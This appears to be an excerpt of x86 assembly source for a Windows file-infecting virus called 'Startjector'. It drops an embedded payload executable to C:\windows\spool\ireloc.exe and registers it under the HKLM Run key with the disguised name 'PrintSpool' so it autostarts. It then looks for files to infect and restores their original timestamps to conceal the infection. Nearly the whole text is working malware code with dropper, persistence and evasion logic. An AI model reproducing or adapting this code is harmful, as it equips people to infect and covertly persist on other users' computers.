;
; (C) CPU - 25-08-2019 .. 04-04-2021
; 
; Startjector extends loadjector to make the dropped
; payload EXE autostart.
;
.386
warn pro
locals
...
@@linkapis:
  ...
  LINK_API SetFileTime
  LINK_API LoadLibraryA

dropper_check:
  ; Check if this is gen zero or not
  cmp ebp, 0h
  ; If it is gen0, jump to find first and start infecting.
  je findfirst
  ; If it isn't gen0, check if the szPayloadPath exists or not
  mov eax, offset szPayloadPath
  add eax, ebp
  mov ebx, offset findData
  add ebx, ebp
  CALL_RUNTIME_API FindFirstFileA, <eax, ebx>
  cmp eax, INVALID_HANDLE_VALUE
  ; If it does exist then let's check reg entries
  jne loadadvapi32

dropper:
  ; There's no existing payload at szPayloadPath
  ; Let's open a file handle for it that we can write.
  mov eax, offset szPayloadPath
  add eax, ebp
  CALL_RUNTIME_API CreateFileA, <eax,GENERIC_READ + GENERIC_WRITE, 0h, 0h, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, 0h>
  cmp eax, INVALID_HANDLE_VALUE
  je findfirst
  mov [ebp + targetFileHandle], eax
 
  ; We'll also create a file mapping with size equal to dropper_payload_size
  mov eax, [ebp + targetFileHandle]
  mov ecx, dropper_payload_size
  CALL_RUNTIME_API CreateFileMappingA, <eax, 0h, PAGE_READWRITE, 0h, ecx, 0h>
  cmp eax, 0h
  je findfirst
...
; Time to write the dropper payload content
@@startcopypayload:
  ; Destination: targetP
  mov edi, [ebp + targetP]
  ; Source: the beginning of the virus code
  mov esi, offset dropper_payload
  add esi, ebp
...
; Load ADVAPI32.dll so we can link APIs to manipulate the registry.
loadadvapi32:
  mov eax, offset szAdvapi32
  add eax, ebp
  CALL_RUNTIME_API LoadLibraryA, <eax>
  cmp eax, 0h
  je findfirst
  mov [ebp + advapi32Base], eax

; With the advapi32 base addr in hand we can link APIs from that DLL
@@linkregapis:
  LINK_API RegCreateKeyExA, <advapi32Base>
  LINK_API RegSetValueExA, <advapi32Base>
  LINK_API RegCloseKey, <advapi32Base>

; Open the Run registry key
@@openregkey:
  mov eax, offset szRegSubKey
  add eax, ebp
  mov ebx, offset regKeyHandle
  add ebx, ebp
  mov ecx, offset regKeyDispo
  add ecx, ebp
  CALL_RUNTIME_API RegCreateKeyExA, <HKEY_LOCAL_MACHINE, eax, 0h, 0h, REG_OPTION_NON_VOLATILE, KEY_READ+KEY_WRITE, 0h, ebx, ecx>
  cmp eax, ERROR_SUCCESS
  jne findfirst

; And set a value to autostart our dropped payload
@@setregvalue:
  mov eax, [ebp + regKeyHandle]
  mov ebx, offset szRegValue
  add ebx, ebp
  mov ecx, offset szPayloadPath
  add ecx, ebp
  CALL_RUNTIME_API RegSetValueExA, <eax, ebx, 0h, REG_SZ, ecx, szPayloadPathLen>  
  ; Note: we don't compare eax to ERROR_SUCCESS here because either
  ; way we'd just move on to closing the key

; Finally, close the registry key
@@closeregkey:
  mov eax, [ebp + regKeyHandle]
  CALL_RUNTIME_API RegCloseKey, <eax>
  ; Note: we don't comprae eax to ERROR_SUCCESS here either for the same
  ; reason as above: we're going to unconditionally continue to findfirst.

findfirst:
  ; Time to find files to infect.
...
; Copy the last write time somewhere safe
@@savewritetime:
  mov ecx, offset findData.ftLastWriteTime
  add ecx, ebp
  mov edx, offset originalLastWrite
  add edx, ebp
  COPY_TIMESTAMP ecx, edx
...
@@cleanupagain:
  ...
  ; Restore the original last write timestamp
  mov eax, [ebp + targetFileHandle]
  mov ebx, offset originalLastWrite
  add ebx, ebp
  CALL_RUNTIME_API SetFileTime, <eax, 0, 0, ebx>
  cmp eax, 0h
  je error
...
REQUIRED_API  SetFileTime
REQUIRED_API  LoadLibraryA
REQUIRED_API  RegCreateKeyExA
REQUIRED_API  RegSetValueExA
REQUIRED_API  RegCloseKey

; Base address of kernel32.dll (found at runtime dynamically)
kernel32Base        DD 0

; Base address of advapi32.dll (loaded w/ LoadLibraryA)
advapi32Base        DD 0
...
; Original last write filetime
originalLastWrite   FILETIME <0>
...
szRegValue     DB "PrintSpool",0
regKeyHandle   DD 0
regKeyDispo    DD 0

szPayloadPath  DB "C:\windows\spool\ireloc.exe",0
szPayloadPathLen EQU $ - szPayloadPath 
dropper_payload:
include wap32.inc
dropper_payload_size EQU $ - dropper_payload
